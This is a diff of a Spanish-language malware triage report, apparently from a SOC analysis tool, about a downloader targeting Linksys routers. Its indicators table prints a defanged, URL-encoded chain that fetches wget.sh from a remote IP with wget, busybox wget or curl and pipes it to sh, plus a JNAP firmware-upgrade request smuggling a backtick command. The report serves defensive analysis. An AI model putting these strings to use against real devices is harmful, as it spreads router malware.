@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 483 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Upgrade` en `hxxp://linksys[.]com/jnap/firmware/Upgrade`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:49:46+00:00`
+- **Registrado:** `2026-08-09T19:49:46.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -47,12 +48,12 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
+| url | hxxp://linksys[.]com/jnap/firmware/Upgrade | strings |
+| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap3%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap3%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20ljnap3 | strings |
 | ip | 190.179.139.XXX | static_analysis |
 | ip | 91.92.40.XXX | static_analysis |
-| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap3%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap3%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20ljnap3 | strings |
-| url | hxxp://linksys[.]com/jnap/firmware/Upgrade | strings |
-| hash | 485a419a754cb518c8c3c85a1aa84bdb2e07d9b2910a61a1a2cc4a715865afc5 | static_analysis |
 | command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd%20/tmp%3Bwget%20http://91.92.40 | strings |
+| hash | 485a419a754cb518c8c3c85a1aa84bdb2e07d9b2910a61a1a2cc4a715865afc5 | static_analysis |
 | ip | 45.153.34.XXX | artifact_source |
 
 ## 🔎 Triage
